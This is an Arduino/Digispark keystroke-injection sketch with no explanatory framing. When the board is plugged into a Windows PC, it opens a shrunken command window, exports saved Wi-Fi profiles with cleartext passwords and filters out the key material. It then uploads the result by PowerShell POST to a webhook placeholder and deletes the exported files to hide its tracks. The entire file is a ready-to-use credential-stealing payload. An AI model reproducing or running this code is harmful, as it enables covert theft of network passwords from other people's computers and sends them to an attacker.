#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28

void setup() {
  pinMode(1, OUTPUT); 
}

void loop() {
   
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(800);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println("cmd"); 
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("mode con? cols=15 lines=1");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern ~keyMaterial~ > Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri <webhook> -Method POST -InFile Wi-Fi-PASS"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
